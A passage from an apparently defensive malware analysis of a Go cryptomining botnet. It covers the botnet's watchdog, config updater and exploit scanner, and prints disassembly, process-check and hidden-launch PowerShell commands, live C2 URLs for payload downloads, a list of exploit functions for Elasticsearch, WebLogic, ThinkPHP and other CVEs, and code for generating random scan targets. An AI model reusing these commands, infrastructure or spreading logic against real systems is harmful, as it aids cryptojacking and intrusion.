<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e15c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e161</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.__tmp_0324_dog_cc.getdata</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e166</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e16b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e170</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">arg_68h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e175</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">arg_70h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e17a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rbp</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_48h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e17f</span>      <span style="color:#66d9ef">add</span> <span style="color:#66d9ef">rsp</span>, <span style="color:#ae81ff">0x50</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0060e183</span>      <span style="color:#66d9ef">ret</span>
</code></pre></div><p>From the list of transactions, the malware extracts all the messages from the
address controlled by the threat actor. The new IP address is slightly
&ldquo;encoded&rdquo;. The pattern &ldquo;2f&rdquo; is replaced with &ldquo;.&rdquo; to produce a valid IP string.
The new C2 server uses the same URL path. With the new C2 server, a new
<code>init.sh</code>/<code>update.sh</code> or <code>init.ps1</code>/<code>update.ps1</code> file is downloaded and
executed.</p>
<h2 id="dog_update_thread">dog_update_thread</h2>
<p>This function downloads and updates the configuration file for the malware. It
downloads the configuration from the URL: <code>{C2URL}/favorite.ico</code>. The file is
an <em>INI</em> file with a list of MD5 digests. The content of one configuration
file is shown below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ini" data-lang="ini"><span style="color:#66d9ef">[cf]</span>
<span style="color:#a6e22e">c: db2df2a149f7726ba59cbda815f429fc</span>

<span style="color:#66d9ef">[mm]</span>
<span style="color:#a6e22e">lin: c74e02044b96d157d214e9871a09531a</span>
<span style="color:#a6e22e">win: da518ae458f4651f350094bc871b12c8</span>

<span style="color:#66d9ef">[ss]</span>
<span style="color:#a6e22e">lin: a90b4d15f14fe59a4951de3840260662</span>
<span style="color:#a6e22e">win: 92fb294baa9545318998fe32e525c527</span>

<span style="color:#66d9ef">[sh]</span>
<span style="color:#a6e22e">lin: 949af511bfb9fb447206e1940448fd3e</span>
<span style="color:#a6e22e">win: 1ac16c6ce62625d4b1fe463bed0609b2</span>

<span style="color:#66d9ef">[dg]</span>
<span style="color:#a6e22e">lin: 318fa2c9d6010ad6b2bc5e23d7a6b756</span>
<span style="color:#a6e22e">win: 38e880f602375cacb6a5e9d81801954f</span>
</code></pre></div><p>Below is a list of the meaning of each abbreviation.</p>
<ul>
<li>cf - Miner configuration file</li>
<li>mm - Monero miner</li>
<li>ss - Scanner &ldquo;module&rdquo;</li>
<li>sh - Shell script: (<code>update.sh</code>, <code>init.sh</code>, <code>update.ps1</code>, <code>init.ps1</code>)</li>
<li>dg - Watchdog &ldquo;module&rdquo;</li>
</ul>
<h2 id="dog_protect_process_thread">dog_protect_process_thread</h2>
<p>This function monitors the mining process and the scanner process.  If anything
happens to them, it will make sure the process is restarted.</p>
<h3 id="linux-process-protection-functionality">Linux Process Protection Functionality</h3>
<p>On Linux, the malware uses <code>ps</code> to check if the process still runs. The command
executed to check if the miner is still running is shown below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">ps -auxf|grep sysupdate|wc -l
</code></pre></div><p>If the output does not contain &ldquo;2&rdquo; a new miner is started. The miner can be
installed in two different locations, depending on the permissions the malware
has. The two paths are:</p>
<ul>
<li><code>/etc/sysupdate</code></li>
<li><code>/tmp/sysupdate</code></li>
</ul>
<p>If the miner is not missing but is not running, the malware will just execute
it. If the file is missing, the malware downloads the <code>update.sh</code> shell script
and executes it to install all the files. The logic is shown below in the <em>ASM</em>
snippet.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006334d5</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.__tmp_0324_dog_cc.Get_miner_path</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006334da</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006334df</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006334e4</span>  <span style="color:#66d9ef">test</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006334e7</span>  <span style="color:#66d9ef">jne</span> <span style="color:#ae81ff">0x633524</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006334e9</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#ae81ff">0x006c7173</span>] <span style="color:#75715e">; lin
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x006334f0</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006334f4</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#ae81ff">3</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006334fd</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.__tmp_0324_dog_cc.Get_tasks_payload</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633502</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633507</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063350c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633510</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633515</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.__tmp_0324_dog_platform.lin_download_payload_and_exec</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063351a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rbp</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_58h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063351f</span>  <span style="color:#66d9ef">add</span> <span style="color:#66d9ef">rsp</span>, <span style="color:#ae81ff">0x60</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633523</span>  <span style="color:#66d9ef">ret</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633524</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_38h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633529</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_40h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063352e</span>  <span style="color:#66d9ef">xorps</span> <span style="color:#66d9ef">xmm0</span>, <span style="color:#66d9ef">xmm0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633531</span>  <span style="color:#66d9ef">movups</span> <span style="color:#66d9ef">xmmword</span> [<span style="color:#66d9ef">var_48h</span>], <span style="color:#66d9ef">xmm0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633536</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> <span style="color:#66d9ef">sym.type.string</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063353d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633541</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_38h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633546</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063354b</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.convT2Estring</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633550</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633555</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063355a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_48h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063355f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_50h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633564</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#ae81ff">0x006c71e8</span>] <span style="color:#75715e">; %s &amp;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x0063356b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063356f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#ae81ff">4</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633578</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_48h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063357d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633582</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_18h</span>], <span style="color:#ae81ff">1</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063358b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_20h</span>], <span style="color:#ae81ff">1</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633594</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.fmt.Sprintf</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x00633599</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_28h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0063359e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_30h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006335a3</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006335a7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">rcx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006335ac</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.__tmp_0324_dog_platform.lin_os_command_exec</span>
</code></pre></div><p>The same process is used for monitoring the scanner. The following command is
executed and the malware checks for a count of &ldquo;2&rdquo; to be returned.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">ps -auxf|grep networkservice|wc -l
</code></pre></div><p>The scanner paths are:</p>
<ul>
<li><code>/etc/networkservice</code></li>
<li><code>/tmp/networkservice</code></li>
</ul>
<h3 id="windows-process-protection-functionality">Windows Process Protection Functionality</h3>
<p>On Windows, the malware uses <em>WMIC</em> to check if the processes are running.  If
the process is not running, the process is started via <em>Powershell</em>. In the
scenario where the file is missing, the <code>update.ps1</code> file is downloaded and
executed.</p>
<p>Commands executed:</p>
<ul>
<li>Check miner: <code>wmic process where name='sysupdate.exe' get processid,commandline</code></li>
<li>Start miner: <code>powershell Start-Process %TEMP%\sysupdate.exe -windowstyle hidden</code></li>
<li>Check scanner: <code>wmic process where name='networkservice.exe' get processid,commandline</code></li>
<li>Start scanner: <code>powershell Start-Process %TEMP%\networkservice.exe -windowstyle hidden</code></li>
</ul>
<h1 id="scanner-component-and-other-ways-of-spreading">Scanner Component and Other Ways of Spreading</h1>
<p>The scanner component is also written in <em>Go</em>. The <em>Linux</em> scanner and the
<em>Windows</em> scanner are compiled from the same codebase. The extracted source code
layout is shown below. Based on function names it appears the following <em>CVEs</em>
are exploited:</p>
<ul>
<li>CVE-2015-1427 (Elasticsearch)</li>
<li>CVE-2014-3120 (Elasticsearch)</li>
<li>CVE-2018-1273 (Spring Data Commons)</li>
<li>CVE-2017-10271 (WebLogic)</li>
</ul>
<p>In addition to the listed CVEs, the following applications or devices appears
to be targeted:</p>
<ul>
<li>CCTV</li>
<li>Drupal</li>
<li>Hadoop</li>
<li>Redis</li>
<li>SQLServer</li>
<li>ThinkPHP</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Package _/tmp/0324/scan/exp: /tmp/0324/scan/exp
File: &lt;autogenerated&gt;	
	init Lines: 1 to 1 (0)	
File: cctv_exploit_wait.go	
	cc_is_shell_rce Lines: 15 to 63 (48)	
	cc_is_shell_rcefunc1 Lines: 32 to 82 (50)	
	cc_shell_rce Lines: 63 to 111 (48)	
	cc_shell_rcefunc1 Lines: 82 to 89 (7)	
	cc_shell_t_rce Lines: 111 to 125 (14)	
	Cctv_exploit Lines: 125 to 128 (3)	
File: drupal_exploit.go	
	dp_isdrupal Lines: 16 to 65 (49)	
	dp_isdrupalfunc1 Lines: 27 to 75 (48)	
	dp_check_payload Lines: 65 to 105 (40)	
	dp_check_payloadfunc1 Lines: 75 to 121 (46)	
	dp_7600_ver8_rce Lines: 105 to 232 (127)	
	dp_7600_ver8_rcefunc1 Lines: 121 to 128 (7)	
	dp_7600_rce Lines: 232 to 257 (25)	
	Drupal_exploit Lines: 257 to 265 (8)	
File: elasticsearch_exploit.go	
	es_exploit_cve20151427_rce Lines: 17 to 78 (61)	
	es_exploit_cve20151427_rcefunc1 Lines: 36 to 138 (102)	
	es_exploit_cve20151427_t_rce Lines: 78 to 103 (25)	
	toj Lines: 103 to 120 (17)	
	es_exploit_cve20143120_rce Lines: 120 to 178 (58)	
	es_exploit_cve20143120_rcefunc1 Lines: 138 to 145 (7)	
	es_exploit_cve20143120_t_rce Lines: 178 to 201 (23)	
	Elasticsearch_exploit Lines: 201 to 204 (3)	
File: get_target.go	
	get_target Lines: 35 to 78 (43)	
	Iam_is_scan Lines: 78 to 90 (12)	
	Report_succ Lines: 90 to 103 (13)	
	get_win_powershell_command_by_cc Lines: 103 to 114 (11)	
	Init_cc Lines: 114 to 118 (4)	
File: hadoop_exploit.go	
	hd_exploit_unaurority_rce Lines: 16 to 117 (101)	
	hd_exploit_unaurority_rcefunc1 Lines: 33 to 88 (55)	
	hd_exploit_unaurority_rcefunc2 Lines: 88 to 95 (7)	
	Hadoop_exploit Lines: 117 to 128 (11)	
File: redis_exploit.go	
	re_exploit_rce Lines: 18 to 107 (89)	
	re_exploit_connect_redis Lines: 107 to 127 (20)	
	re_exploit_redis_brute Lines: 127 to 146 (19)	
	re_exploit_unaurority_rce Lines: 146 to 170 (24)	
	Redis_exploit Lines: 170 to 182 (12)	
File: spring_exploit.go	
	sp_cve20181273_exists Lines: 15 to 70 (55)	
	sp_cve20181273_existsfunc1 Lines: 34 to 87 (53)	
	sp_cve20181273_exploit Lines: 70 to 124 (54)	
	sp_cve20181273_exploitfunc1 Lines: 87 to 94 (7)	
	Spring_exploit Lines: 124 to 137 (13)	
File: sqlserver_exploit.go	
	ss_execute_sql Lines: 137 to 155 (18)	
	ss_execute_payload Lines: 155 to 179 (24)	
	ss_exploit_xcmdshell Lines: 179 to 225 (46)	
	ss_exploit_sp_oacreate Lines: 225 to 284 (59)	
	ss_crack_login Lines: 284 to 341 (57)	
	ss_exploit Lines: 341 to 389 (48)	
	Sqlserver_exploit Lines: 389 to 390 (1)	
File: thinkphp_exploit.go	
	tp_isThinkphp Lines: 24 to 97 (73)	
	tp_isThinkphpfunc1 Lines: 58 to 112 (54)	
	tp5_rce_Exists Lines: 97 to 143 (46)	
	tp5_rce_Existsfunc1 Lines: 112 to 163 (51)	
	tp_exploit_tp5rce_exp Lines: 143 to 190 (47)	
	tp_exploit_tp5rce_expfunc1 Lines: 163 to 241 (78)	
	tp_exploit_tp5rce Lines: 190 to 217 (27)	
	tp5_23_rce_Exists Lines: 217 to 280 (63)	
	tp5_23_rce_Existsfunc1 Lines: 241 to 297 (56)	
	tp_exploit_tp5_23_rce_exp Lines: 280 to 326 (46)	
	tp_exploit_tp5_23_rce_expfunc1 Lines: 297 to 304 (7)	
	tp_exploit_tp5_23rce Lines: 326 to 355 (29)	
	Thinkphp_exploit Lines: 355 to 358 (3)	
File: utils.go	
	Http_GetData Lines: 14 to 60 (46)	
	Http_GetDatafunc1 Lines: 25 to 54 (29)	
	Encode_powershell Lines: 60 to 76 (16)	
File: weblogic_exploit.go	
	wl_wls_urlistrue Lines: 43 to 78 (35)	
	wl_wls_urlistruefunc1 Lines: 54 to 95 (41)	
	wl_cve201710271_rce Lines: 78 to 121 (43)	
	wl_cve201710271_rcefunc1 Lines: 95 to 102 (7)	
	wl_cve201710271_t_rce Lines: 121 to 149 (28)	
	Weblogic_exploit Lines: 149 to 155 (6)	
Package _/tmp/0324/scan/ipc: /tmp/0324/scan/ipc
File: &lt;autogenerated&gt;	
	init Lines: 1 to 52 (51)	
File: ipcn.go	
	download_ipdb Lines: 70 to 92 (22)	
	Init_ip Lines: 92 to 111 (19)	
Package main: /tmp/0324/scan
File: &lt;autogenerated&gt;	
	init Lines: 1 to 19 (18)	
File: top.go	
	openPort Lines: 52 to 68 (16)	
	randomIp Lines: 68 to 105 (37)	
	scan Lines: 105 to 236 (131)	
	mainScan Lines: 236 to 275 (39)	
	initdebug_ip Lines: 275 to 288 (13)	
	main Lines: 288 to 295 (7)	
</code></pre></div><h2 id="pre-scanning-phase">Pre-scanning Phase</h2>
<p>Before the module starts scanning, it downloads two lists of IPs from the two
<em>URLs</em> below. The filenames suggest that the IP addresses in the list are
Chinese.</p>
<ul>
<li><code>http://178.157.91.26/ec8ce6ab/ip_cn.txt</code></li>
<li><code>http://178.157.91.26/ec8ce6ab/ips_cn.txt</code></li>
</ul>
<p>The scanner has support for the use of multiple C2s. It selects one of the C2s
and uses the <em>URL</em> to build the first part of the payload for all the exploits.
Currently, only one address is in the list. An example of the C2 <em>URL</em> is shown
below.</p>
<ul>
<li><code>http://45.137.151.106/ec8ce6abb3e952a85b85/</code></li>
</ul>
<h2 id="ip-generation">IP Generation</h2>
<p>The scanner generates random IP addresses by first generating a random number
between 0 and 255. If the number is <em>127</em>, <em>10</em>, or <em>172</em>, it picks a new
number. Otherwise,  three more numbers are generated.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006b0e6c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#ae81ff">0xff</span> <span style="color:#75715e">; 255
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x006b0e74</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.math_rand.Intn</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006b0e79</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006b0e7e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_38h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006b0e83</span>  <span style="color:#66d9ef">cmp</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">0x7f</span> <span style="color:#75715e">; 127
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x006b0e87</span>  <span style="color:#66d9ef">je</span> <span style="color:#ae81ff">0x6b0e6c</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006b0e89</span>  <span style="color:#66d9ef">cmp</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">0xa</span> <span style="color:#75715e">; 10
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x006b0e8d</span>  <span style="color:#66d9ef">je</span> <span style="color:#ae81ff">0x6b0e6c</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006b0e8f</span>  <span style="color:#66d9ef">cmp</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">0xac</span> <span style="color:#75715e">; 172
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x006b0e95</span>  <span style="color:#66d9ef">je</span> <span style="color:#ae81ff">0x6b0e6c</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006b0e97</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#ae81ff">0xff</span> <span style="color:#75715e">; 255
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x006b0e9f</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.math_rand.Intn</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006b0ea4</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006b0ea9</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_40h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006b0eae</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#ae81ff">0xff</span> <span style="color:#75715e">; 255
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x006b0eb6</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.math_rand.Intn</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006b0ebb</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006b0ec0</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_48h</span>], <span style="color:#66d9ef">rax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006b0ec5</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#ae81ff">0xff</span> <span style="color:#75715e">; 255
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x006b0ecd</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.math_rand.Intn</span>
</code></pre></div><p>The four numbers are used to create an IP string in <em>dot-decimal</em> notation
using the <code>Sprintf</code> function from the <code>fmt</code> standard library package. The
corresponding <em>Go</em> code would look something similar to the code below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">for</span> {
    <span style="color:#a6e22e">n1</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">rand</span>.<span style="color:#a6e22e">Intn</span>(<span style="color:#ae81ff">255</span>)
    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">n1</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">127</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">n1</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">n1</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">172</span> {
        <span style="color:#66d9ef">continue</span>
    }
    <span style="color:#a6e22e">n2</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">rand</span>.<span style="color:#a6e22e">Intn</span>(<span style="color:#ae81ff">255</span>)
    <span style="color:#a6e22e">n3</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">rand</span>.<span style="color:#a6e22e">Intn</span>(<span style="color:#ae81ff">255</span>)
    <span style="color:#a6e22e">n4</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">rand</span>.<span style="color:#a6e22e">Intn</span>(<span style="color:#ae81ff">255</span>)
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;%d.%d.%d.%d&#34;</span>, <span style="color:#a6e22e">n1</span>, <span style="color:#a6e22e">n2</span>, <span style="color:#a6e22e">n3</span>, <span style="color:#a6e22e">n4</span>)
}
</code></pre></div><h2 id="payloads">Payloads</h2>
<p>The scanner has a variety of payloads that is used against different services.
Which payload to be used, is dependent on the open ports on the scanned
